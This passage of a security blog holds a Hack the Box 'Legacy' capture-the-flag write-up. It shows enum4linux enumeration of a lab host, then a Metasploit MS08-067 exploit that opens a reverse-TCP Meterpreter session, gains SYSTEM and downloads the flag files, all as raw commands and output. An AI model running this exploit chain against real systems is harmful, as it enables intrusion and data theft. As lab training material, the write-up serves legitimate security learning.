							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog-6">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-6-label" for="subscribe-field-6" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field-6" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog-6">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="809">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/programming/" rel="category tag">Programming</a>, <a href="/category/tutorials/" rel="category tag">Tutorials</a></span> | <span class="tags-links">Tagged <a href="/tag/bot/" rel="tag">Bot</a>, <a href="/tag/slack/" rel="tag">Slack</a>, <a href="/tag/tutorial/" rel="tag">Tutorial</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

<article id="post-737" class="post-737 post type-post status-publish format-standard has-post-thumbnail hentry category-ctf category-hack-the-box category-pentesting tag-hackthebox tag-legacy tag-windows tag-writeup no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="1024" height="1024" src="/wp-content/uploads/2017/09/image1501218566.jpeg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?w=1024&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?resize=150%2C150&amp;ssl=1 150w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/image1501218566.jpeg?resize=100%2C100&amp;ssl=1 100w" sizes="auto, (max-width: 1024px) 100vw, 1024px">	</div>
	<header class="entry-header">
		<h2 class="entry-title"><a href="/htb-legacy-get-system-jutsu/" rel="bookmark">Hack the Box Legacy Get System no Jutsu</a></h2>		<div class="entry-meta">
			<span class="posted-on">Posted on <a href="/htb-legacy-get-system-jutsu/" rel="bookmark"><time class="entry-date published" datetime="2017-09-10T15:12:34+08:00">September 10, 2017</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/htb-legacy-get-system-jutsu/#respond">Leave a Comment<span class="screen-reader-text"> on Hack the Box Legacy Get System no Jutsu</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		<p>This post contains the actual commands that I used in hacking and getting the user and root hashes on HTB Legacy Box.</p>
<p><strong>Enumeration</strong></p>
<pre>kaipowered@debian:~/Downloads/enum4linux-0.8.9/enum4linux-0.8.9$ sudo ./enum4linux.pl -a 10.10.10.4
[sudo] password for kaipowered:
WARNING: ldapsearch is not in your path. Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jul 18 22:42:06 2017

==========================
| Target Information |
==========================
Target ........... 10.10.10.4
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none




==================================================
| Enumerating Workgroup/Domain on 10.10.10.4 |
==================================================
[+] Got domain/workgroup name: HTB

==========================================
| Nbtstat Information for 10.10.10.4 |
==========================================
Looking up status of 10.10.10.4
LEGACY &lt;00&gt; - B &lt;ACTIVE&gt; Workstation Service
HTB &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Domain/Workgroup Name
LEGACY &lt;20&gt; - B &lt;ACTIVE&gt; File Server Service
HTB &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Browser Service Elections
HTB &lt;1d&gt; - B &lt;ACTIVE&gt; Master Browser
..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Master Browser

MAC Address = 00-50-56-97-0E-E1

===================================
| Session Check on 10.10.10.4 |
===================================
[+] Server 10.10.10.4 allows sessions using username '', password ''

=========================================
| Getting domain SID for 10.10.10.4 |
=========================================
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

====================================
| OS information on 10.10.10.4 |
====================================
[+] Got OS info for 10.10.10.4 from smbclient: Domain=[LEGACY] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED

===========================
| Users on 10.10.10.4 |
===========================
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

=======================================
| Share Enumeration on 10.10.10.4 |
=======================================
[E] Can't list shares: NT_STATUS_ACCESS_DENIED

[+] Attempting to map shares on 10.10.10.4

==================================================
| Password Policy Information for 10.10.10.4 |
==================================================
[E] Unexpected error from polenum.py:
Traceback (most recent call last):
File "/usr/local/bin/polenum.py", line 32, in &lt;module&gt;
from impacket import uuid
ImportError: No module named impacket
[E] Failed to get password policy with rpcclient




============================
| Groups on 10.10.10.4 |
============================

[+] Getting builtin groups:
[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED

[+] Getting builtin group memberships:

[+] Getting local groups:
[E] Can't get local groups: NT_STATUS_ACCESS_DENIED

[+] Getting local group memberships:

[+] Getting domain groups:
[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED

[+] Getting domain group memberships:

=====================================================================
| Users on 10.10.10.4 via RID cycling (RIDS: 500-550,1000-1050) |
=====================================================================
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible.

===========================================
| Getting printer info for 10.10.10.4 |
===========================================
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED



enum4linux complete on Tue Jul 18 22:42:49 2017</pre>
<p><strong>Exploitation and Post Exploitation</strong></p>
<div>
<pre>msf exploit(ms06_040_netapi) &gt; use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) &gt; show options

Module options (exploit/windows/smb/ms08_067_netapi):

Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 445 yes The SMB service port (TCP)
SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)




Exploit target:

Id Name
-- ----
0 Automatic Targeting




msf exploit(ms08_067_netapi) &gt; set RHOST 10.10.10.4
RHOST =&gt; 10.10.10.4
msf exploit(ms08_067_netapi) &gt; run

[*] Started reverse TCP handler on 10.10.15.172:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (956991 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.15.172:4444 -&gt; 10.10.10.4:1028) at 2017-07-18 22:26:33 +0800

meterpreter &gt; sysinfo
Computer : LEGACY
OS : Windows XP (Build 2600, Service Pack 3).
Architecture : x86
System Language : en_US
Domain : HTB
Logged On Users : 1
Meterpreter : x86/windows
meterpreter &gt; whoami
[-] Unknown command: whoami.
meterpreter &gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &gt; shell
Process 1512 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;cd c:\Users
cd c:\Users
The system cannot find the path specified.

C:\WINDOWS\system32&gt;cd C
cd C
The system cannot find the path specified.

C:\WINDOWS\system32&gt;cd C:\
cd C:\

C:\&gt;dir
dir
Volume in drive C has no label.
Volume Serial Number is 54BF-723B

Directory of C:\

16/03/2017 08:30 ï¿½ï¿½ 0 AUTOEXEC.BAT
16/03/2017 08:30 ï¿½ï¿½ 0 CONFIG.SYS
16/03/2017 09:07 ï¿½ï¿½ &lt;DIR&gt; Documents and Settings
16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; Program Files
16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; WINDOWS
2 File(s) 0 bytes
3 Dir(s) 6.488.408.064 bytes free

C:\&gt;cd WINDOWS
cd WINDOWS

C:\WINDOWS&gt;dir
dir
Volume in drive C has no label.
Volume Serial Number is 54BF-723B

Directory of C:\WINDOWS

16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; .
16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; ..
23/07/2017 07:19 ï¿½ï¿½ 0 0.log
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; addins
16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; AppPatch
23/08/2001 03:00 ï¿½ï¿½ 1.272 Blue Lace 16.bmp
23/08/2001 03:00 ï¿½ï¿½ 82.944 clock.avi
16/03/2017 08:27 ï¿½ï¿½ 200 cmsetacl.log
23/08/2001 03:00 ï¿½ï¿½ 17.062 Coffee Bean.bmp
16/03/2017 08:32 ï¿½ï¿½ 15.905 comsetup.log
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; Config
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; Connection Wizard
16/03/2017 08:30 ï¿½ï¿½ 0 control.ini
16/03/2017 08:28 ï¿½ï¿½ &lt;DIR&gt; Cursors
16/03/2017 08:20 ï¿½ï¿½ &lt;DIR&gt; Debug
23/08/2001 03:00 ï¿½ï¿½ 2 desktop.ini
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; Driver Cache
16/03/2017 08:28 ï¿½ï¿½ 130 DtcInstall.log
16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; ehome
14/04/2008 06:42 ï¿½ï¿½ 1.033.728 explorer.exe
23/08/2001 03:00 ï¿½ï¿½ 80 explorer.scf
16/03/2017 08:29 ï¿½ï¿½ 11.537 FaxSetup.log
23/08/2001 03:00 ï¿½ï¿½ 16.730 FeatherTexture.bmp
23/08/2001 03:00 ï¿½ï¿½ 17.336 Gone Fishing.bmp
23/08/2001 03:00 ï¿½ï¿½ 26.582 Greenstone.bmp
16/03/2017 08:29 ï¿½ï¿½ &lt;DIR&gt; Help
14/04/2008 06:42 ï¿½ï¿½ 10.752 hh.exe
16/03/2017 08:32 ï¿½ï¿½ 48.335 iis6.log
16/03/2017 08:30 ï¿½ï¿½ &lt;DIR&gt; ime
16/03/2017 08:32 ï¿½ï¿½ 4.382 imsins.log
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; java
16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; L2Schemas
16/03/2017 08:29 ï¿½ï¿½ 1.487 MedCtrOC.log
16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; Media
16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; msagent
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; msapps
23/08/2001 03:00 ï¿½ï¿½ 1.405 msdfmap.ini
16/03/2017 08:29 ï¿½ï¿½ 871 msgsocm.log
16/03/2017 08:28 ï¿½ï¿½ 10.066 msmqinst.log
16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; mui
16/03/2017 08:29 ï¿½ï¿½ 2.790 netfxocm.log
16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; Network Diagnostic
14/04/2008 06:42 ï¿½ï¿½ 69.120 NOTEPAD.EXE
16/03/2017 08:32 ï¿½ï¿½ 7.948 ntdtcsetup.log
16/03/2017 08:29 ï¿½ï¿½ 14.772 ocgen.log
16/03/2017 08:32 ï¿½ï¿½ 885 ocmsn.log
16/03/2017 08:30 ï¿½ï¿½ 4.161 ODBCINST.INI
16/03/2017 09:07 ï¿½ï¿½ 1.178 OEWABLog.txt
16/03/2017 08:29 ï¿½ï¿½ &lt;DIR&gt; Offline Web Pages
16/03/2017 08:29 ï¿½ï¿½ &lt;DIR&gt; pchealth
16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; PeerNet
23/08/2001 03:00 ï¿½ï¿½ 65.954 Prairie Wind.bmp
16/03/2017 09:18 ï¿½ï¿½ &lt;DIR&gt; Prefetch
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; Provisioning
14/04/2008 06:42 ï¿½ï¿½ 146.432 regedit.exe
16/03/2017 08:30 ï¿½ï¿½ &lt;DIR&gt; Registration
16/03/2017 08:32 ï¿½ï¿½ 8.192 REGLOCS.OLD
16/03/2017 08:24 ï¿½ï¿½ 1.690 regopt.log
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; repair
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; Resources
23/08/2001 03:00 ï¿½ï¿½ 17.362 Rhododendron.bmp
23/08/2001 03:00 ï¿½ï¿½ 26.680 River Sumida.bmp
23/08/2001 03:00 ï¿½ï¿½ 65.832 Santa Fe Stucco.bmp
11/05/2017 01:31 ï¿½ï¿½ 1.306 SchedLgU.Txt
16/03/2017 08:30 ï¿½ï¿½ &lt;DIR&gt; security
16/03/2017 08:29 ï¿½ï¿½ 1.022 sessmgr.setup.log
14/04/2008 08:40 ï¿½ï¿½ 1.296.669 SET3.tmp
14/04/2008 08:34 ï¿½ï¿½ 1.088.840 SET4.tmp
14/04/2008 08:34 ï¿½ï¿½ 16.535 SET8.tmp
16/03/2017 08:32 ï¿½ï¿½ 159.934 setupact.log
11/05/2017 01:31 ï¿½ï¿½ 196.252 setupapi.log
16/03/2017 08:20 ï¿½ï¿½ 0 setuperr.log
16/03/2017 08:33 ï¿½ï¿½ 747.894 setuplog.txt
23/08/2001 03:00 ï¿½ï¿½ 65.978 Soap Bubbles.bmp
16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; SoftwareDistribution
16/03/2017 08:29 ï¿½ï¿½ &lt;DIR&gt; srchasst
16/03/2017 08:22 ï¿½ï¿½ 0 Sti_Trace.log
16/03/2017 08:20 ï¿½ï¿½ &lt;DIR&gt; system
16/03/2017 08:20 ï¿½ï¿½ 231 system.ini
23/07/2017 07:23 ï¿½ï¿½ &lt;DIR&gt; system32
16/03/2017 08:32 ï¿½ï¿½ 1.252 tabletoc.log
23/08/2001 03:00 ï¿½ï¿½ 15.360 TASKMAN.EXE
11/05/2017 01:30 ï¿½ï¿½ &lt;DIR&gt; Temp
16/03/2017 08:32 ï¿½ï¿½ 10.801 tsoc.log
23/08/2001 03:00 ï¿½ï¿½ 94.784 twain.dll
16/03/2017 08:18 ï¿½ï¿½ &lt;DIR&gt; twain_32
14/04/2008 06:42 ï¿½ï¿½ 50.688 twain_32.dll
23/08/2001 03:00 ï¿½ï¿½ 49.680 twunk_16.exe
23/08/2001 03:00 ï¿½ï¿½ 25.600 twunk_32.exe
16/03/2017 08:28 ï¿½ï¿½ 36 vb.ini
16/03/2017 08:28 ï¿½ï¿½ 37 vbaddin.ini
23/08/2001 03:00 ï¿½ï¿½ 18.944 vmmreg32.dll
16/03/2017 08:29 ï¿½ï¿½ &lt;DIR&gt; Web
16/03/2017 08:22 ï¿½ï¿½ 501 wiadebug.log
16/03/2017 08:22 ï¿½ï¿½ 49 wiaservc.log
16/03/2017 08:30 ï¿½ï¿½ 477 win.ini
23/07/2017 07:24 ï¿½ï¿½ 11.076 WindowsUpdate.log
23/08/2001 03:00 ï¿½ï¿½ 256.192 winhelp.exe
14/04/2008 06:42 ï¿½ï¿½ 283.648 winhlp32.exe
16/03/2017 08:20 ï¿½ï¿½ &lt;DIR&gt; WinSxS
16/03/2017 09:07 ï¿½ï¿½ 1.107 wmsetup.log
16/03/2017 08:30 ï¿½ï¿½ 316.640 WMSysPr9.prx
23/08/2001 03:00 ï¿½ï¿½ 9.522 Zapotec.bmp
23/08/2001 03:00 ï¿½ï¿½ 707 _default.pif
68 File(s) 6.455.564 bytes
36 Dir(s) 6.488.403.968 bytes free

C:\WINDOWS&gt;dir system
dir system
Volume in drive C has no label.
Volume Serial Number is 54BF-723B

Directory of C:\WINDOWS\system

16/03/2017 08:20 ï¿½ï¿½ &lt;DIR&gt; .
16/03/2017 08:20 ï¿½ï¿½ &lt;DIR&gt; ..
23/08/2001 03:00 ï¿½ï¿½ 69.584 AVICAP.DLL
23/08/2001 03:00 ï¿½ï¿½ 109.456 AVIFILE.DLL
23/08/2001 03:00 ï¿½ï¿½ 32.816 COMMDLG.DLL
23/08/2001 03:00 ï¿½ï¿½ 2.000 KEYBOARD.DRV
23/08/2001 03:00 ï¿½ï¿½ 9.936 LZEXPAND.DLL
23/08/2001 03:00 ï¿½ï¿½ 73.376 MCIAVI.DRV
23/08/2001 03:00 ï¿½ï¿½ 25.264 MCISEQ.DRV
23/08/2001 03:00 ï¿½ï¿½ 28.160 MCIWAVE.DRV
13/04/2008 11:24 ï¿½ï¿½ 68.768 MMSYSTEM.DLL
23/08/2001 03:00 ï¿½ï¿½ 1.152 MMTASK.TSK
23/08/2001 03:00 ï¿½ï¿½ 2.032 MOUSE.DRV
23/08/2001 03:00 ï¿½ï¿½ 126.912 MSVIDEO.DLL
23/08/2001 03:00 ï¿½ï¿½ 82.944 OLECLI.DLL
23/08/2001 03:00 ï¿½ï¿½ 24.064 OLESVR.DLL
23/08/2001 03:00 ï¿½ï¿½ 59.167 setup.inf
23/08/2001 03:00 ï¿½ï¿½ 5.120 SHELL.DLL
23/08/2001 03:00 ï¿½ï¿½ 1.744 SOUND.DRV
23/08/2001 03:00 ï¿½ï¿½ 5.532 stdole.tlb
23/08/2001 03:00 ï¿½ï¿½ 3.360 SYSTEM.DRV
23/08/2001 03:00 ï¿½ï¿½ 19.200 TAPI.DLL
23/08/2001 03:00 ï¿½ï¿½ 4.048 TIMER.DRV
23/08/2001 03:00 ï¿½ï¿½ 9.008 VER.DLL
23/08/2001 03:00 ï¿½ï¿½ 2.176 VGA.DRV
23/08/2001 03:00 ï¿½ï¿½ 13.600 WFWNET.DRV
14/04/2008 06:42 ï¿½ï¿½ 146.432 WINSPOOL.DRV
25 File(s) 925.851 bytes
2 Dir(s) 6.488.403.968 bytes free

C:\WINDOWS&gt;dir ehome
dir ehome
Volume in drive C has no label.
Volume Serial Number is 54BF-723B

Directory of C:\WINDOWS\ehome

16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; .
16/03/2017 08:19 ï¿½ï¿½ &lt;DIR&gt; ..
14/04/2008 06:41 ï¿½ï¿½ 33.792 custsat.dll
1 File(s) 33.792 bytes
2 Dir(s) 6.488.403.968 bytes free

C:\WINDOWS&gt;dir temp
dir temp
Volume in drive C has no label.
Volume Serial Number is 54BF-723B

Directory of C:\WINDOWS\temp

11/05/2017 01:30 ï¿½ï¿½ &lt;DIR&gt; .
11/05/2017 01:30 ï¿½ï¿½ &lt;DIR&gt; ..
0 File(s) 0 bytes
2 Dir(s) 6.488.395.776 bytes free

C:\WINDOWS&gt;cd ..
cd ..

C:\&gt;cd "Documents and Settings"
cd "Documents and Settings"

C:\Documents and Settings&gt;dir
dir
Volume in drive C has no label.
Volume Serial Number is 54BF-723B

Directory of C:\Documents and Settings

16/03/2017 09:07 ï¿½ï¿½ &lt;DIR&gt; .
16/03/2017 09:07 ï¿½ï¿½ &lt;DIR&gt; ..
16/03/2017 09:07 ï¿½ï¿½ &lt;DIR&gt; Administrator
16/03/2017 08:29 ï¿½ï¿½ &lt;DIR&gt; All Users
16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; john
0 File(s) 0 bytes
5 Dir(s) 6.488.395.776 bytes free

C:\Documents and Settings&gt;cd john
cd john

C:\Documents and Settings\john&gt;dir
dir
Volume in drive C has no label.
Volume Serial Number is 54BF-723B

Directory of C:\Documents and Settings\john

16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; .
16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; ..
16/03/2017 09:19 ï¿½ï¿½ &lt;DIR&gt; Desktop
16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; Favorites
16/03/2017 08:33 ï¿½ï¿½ &lt;DIR&gt; My Documents
16/03/2017 08:20 ï¿½ï¿½ &lt;DIR&gt; Start Menu
0 File(s) 0 bytes
6 Dir(s) 6.488.395.776 bytes free

C:\Documents and Settings\john&gt;cd Desktop
cd Desktop

C:\Documents and Settings\john\Desktop&gt;dir
dir
Volume in drive C has no label.
Volume Serial Number is 54BF-723B

Directory of C:\Documents and Settings\john\Desktop

16/03/2017 09:19 ï¿½ï¿½ &lt;DIR&gt; .
16/03/2017 09:19 ï¿½ï¿½ &lt;DIR&gt; ..
16/03/2017 09:19 ï¿½ï¿½ 32 user.txt
1 File(s) 32 bytes
2 Dir(s) 6.488.395.776 bytes free

C:\Documents and Settings\john\Desktop&gt;edit user.txt
edit user.txt
^C
Terminate channel 1? [y/N] y
meterpreter &gt; pwd
C:\WINDOWS\system32
meterpreter &gt; cd C:\Documents and Settings\john\Desktop
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter &gt; cd C:
meterpreter &gt; pwd
C:\WINDOWS\system32
meterpreter &gt; lpwd
/home/kaipowered/Documents/HTB
meterpreter &gt; cd C:\
meterpreter &gt; pwd
C:\
meterpreter &gt; cd "Documents and Settings"
meterpreter &gt; pwd
C:\Documents and Settings
meterpreter &gt; cd john
meterpreter &gt; cd Desktop
meterpreter &gt; download user.txt
[*] Downloading: user.txt -&gt; user.txt
[*] Downloaded 32.00 B of 32.00 B (100.0%): user.txt -&gt; user.txt
[*] download : user.txt -&gt; user.txt
meterpreter &gt; pwd
C:\Documents and Settings\john\Desktop
meterpreter &gt; cd ..
meterpreter &gt; cd ..
meterpreter &gt; pwd
C:\Documents and Settings
meterpreter &gt; dir
Listing: C:\Documents and Settings
==================================

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
40777/rwxrwxrwx 0 dir 2017-03-16 14:07:21 +0800 Administrator
40777/rwxrwxrwx 0 dir 2017-03-16 13:29:48 +0800 All Users
40777/rwxrwxrwx 0 dir 2017-03-16 13:33:37 +0800 Default User
40777/rwxrwxrwx 0 dir 2017-03-16 13:32:52 +0800 LocalService
40777/rwxrwxrwx 0 dir 2017-03-16 13:32:43 +0800 NetworkService
40777/rwxrwxrwx 0 dir 2017-03-16 13:33:42 +0800 john

meterpreter &gt; cd Administrator
meterpreter &gt; dir
Listing: C:\Documents and Settings\Administrator
================================================

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
40555/r-xr-xr-x 0 dir 2017-03-16 14:07:29 +0800 Application Data
40777/rwxrwxrwx 0 dir 2017-03-16 13:32:27 +0800 Cookies
40777/rwxrwxrwx 0 dir 2017-03-16 14:18:27 +0800 Desktop
40555/r-xr-xr-x 0 dir 2017-03-16 14:07:32 +0800 Favorites
40777/rwxrwxrwx 0 dir 2017-03-16 13:20:48 +0800 Local Settings
40555/r-xr-xr-x 0 dir 2017-03-16 14:07:31 +0800 My Documents
100666/rw-rw-rw- 524288 fil 2017-05-11 06:31:16 +0800 NTUSER.DAT
100666/rw-rw-rw- 1024 fil 2017-07-24 00:18:53 +0800 NTUSER.DAT.LOG
40777/rwxrwxrwx 0 dir 2017-03-16 13:20:48 +0800 NetHood
40777/rwxrwxrwx 0 dir 2017-03-16 13:20:48 +0800 PrintHood
40555/r-xr-xr-x 0 dir 2017-03-16 14:07:31 +0800 Recent
40555/r-xr-xr-x 0 dir 2017-03-16 14:07:24 +0800 SendTo
40555/r-xr-xr-x 0 dir 2017-03-16 13:20:48 +0800 Start Menu
40777/rwxrwxrwx 0 dir 2017-03-16 13:28:41 +0800 Templates
100666/rw-rw-rw- 178 fil 2017-05-11 06:31:16 +0800 ntuser.ini

meterpreter &gt; cd Desktop
meterpreter &gt; dir
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
100666/rw-rw-rw- 32 fil 2017-03-16 14:18:50 +0800 root.txt

meterpreter &gt; download root.txt
[*] Downloading: root.txt -&gt; root.txt
[*] Downloaded 32.00 B of 32.00 B (100.0%): root.txt -&gt; root.txt
[*] download : root.txt -&gt; root.txt
meterpreter &gt;</pre>
</div>
<p>&nbsp;</p>


<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog-7">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-7-label" for="subscribe-field-7" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field-7" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog-7">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="737">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/ctf/" rel="category tag">Capture The Flag</a>, <a href="/category/hack-the-box/" rel="category tag">Hack the Box</a>, <a href="/category/pentesting/" rel="category tag">Penetration Testing</a></span> | <span class="tags-links">Tagged <a href="/tag/hackthebox/" rel="tag">hackthebox</a>, <a href="/tag/legacy/" rel="tag">legacy</a>, <a href="/tag/windows/" rel="tag">windows</a>, <a href="/tag/writeup/" rel="tag">writeup</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

<article id="post-405" class="post-405 post type-post status-publish format-standard has-post-thumbnail hentry category-ctf category-vulnhub category-writeups tag-catchmeifyoucan tag-linux tag-skydog tag-vulnhub tag-writeup no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="1024" height="768" src="/wp-content/uploads/2017/09/2002_catch_me_if_you_can_wallpaper_001.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/2002_catch_me_if_you_can_wallpaper_001.jpg?w=1024&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/2002_catch_me_if_you_can_wallpaper_001.jpg?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/2002_catch_me_if_you_can_wallpaper_001.jpg?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2017/09/2002_catch_me_if_you_can_wallpaper_001.jpg?resize=800%2C600&amp;ssl=1 800w" sizes="auto, (max-width: 1024px) 100vw, 1024px">	</div>
	<header class="entry-header">
